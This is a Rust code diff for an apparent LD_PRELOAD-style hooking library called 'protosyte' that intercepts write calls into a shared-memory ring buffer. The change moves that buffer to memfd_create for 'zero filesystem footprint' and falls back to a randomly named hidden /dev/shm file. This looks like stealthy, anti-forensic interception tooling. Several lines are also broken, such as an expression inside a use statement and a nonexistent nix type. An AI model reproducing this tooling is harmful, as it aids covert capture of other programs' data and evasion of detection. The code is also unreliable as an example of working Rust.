@@ -8,6 +8,8 @@ use std::ptr;
 use std::sync::atomic::{AtomicPtr, Ordering};
 use libc::{dlopen, dlsym, RTLD_NEXT, FILE, O_CREAT, O_RDWR, O_TRUNC, S_IRUSR, S_IWUSR, 
            mmap, MAP_SHARED, PROT_READ | PROT_WRITE, close, open, write as sys_write};
+use nix::unistd::Fd;
+use std::os::unix::io::{RawFd, AsRawFd};
 
 // Type definitions for hooked functions
 type WriteFn = extern "C" fn(fd: c_int, buf: *const c_void, count: c_size_t) -> c_ssize_t;
@@ -23,20 +25,38 @@ const BUFFER_SIZE: usize = 1024 * 1024; // 1MB
 static mut RING_BUFFER: *mut u8 = ptr::null_mut();
 static mut RING_BUFFER_FD: c_int = -1;
 
-// Initialize shared memory buffer
+// Initialize shared memory buffer using memfd (memory-only, no filesystem)
 #[no_mangle]
 pub extern "C" fn init_hook_buffer() -> c_int {
     unsafe {
-        let shm_path = CString::new("/dev/shm/.protosyte_hook").unwrap();
+        // Use memfd_create for anonymous shared memory (zero filesystem footprint)
+        // memfd files don't appear in /proc/filesystems and are automatically cleaned up
+        use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
+        use nix::unistd::ftruncate;
         
-        // Create/open shared memory file
-        let fd = open(shm_path.as_ptr(), O_CREAT | O_RDWR | O_TRUNC, S_IRUSR | S_IWUSR);
-        if fd < 0 {
-            return -1;
-        }
+        let name = CString::new("protosyte_ringbuf").unwrap();
+        let fd = match memfd_create(&name, MemFdCreateFlag::MFD_CLOEXEC | MemFdCreateFlag::MFD_ALLOW_SEALING) {
+            Ok(fd) => fd.as_raw_fd(),
+            Err(_) => {
+                // Fallback to /dev/shm if memfd not available (older kernels)
+                let pid = std::process::id();
+                // Use libc random() for compatibility (no external dependencies)
+                let random = unsafe { libc::random() };
+                let shm_path = format!("/dev/shm/.protosyte_{}_{}", pid, random);
+                let path_cstr = CString::new(shm_path).unwrap();
+                let fallback_fd = open(path_cstr.as_ptr(), O_CREAT | O_RDWR | O_TRUNC, S_IRUSR | S_IWUSR);
+                if fallback_fd < 0 {
+                    return -1;
+                }
+                fallback_fd
+            }
+        };
         
         // Truncate to buffer size
-        libc::ftruncate(fd, BUFFER_SIZE as i64);
+        if ftruncate(nix::unistd::Fd::from_raw_fd(fd), BUFFER_SIZE as i64).is_err() {
+            close(fd);
+            return -1;
+        }
         
         // Map into memory
         let addr = mmap(
@@ -57,7 +77,7 @@ pub extern "C" fn init_hook_buffer() -> c_int {
         RING_BUFFER_FD = fd;
         
         // Initialize ring buffer header (offset tracking)
-        ptr::write(RING_BUFFER as *mut u64, 0);
+        ptr::write(RING_BUFFER as *mut u64, 8); // Start after header (8 bytes)
         
         0
     }
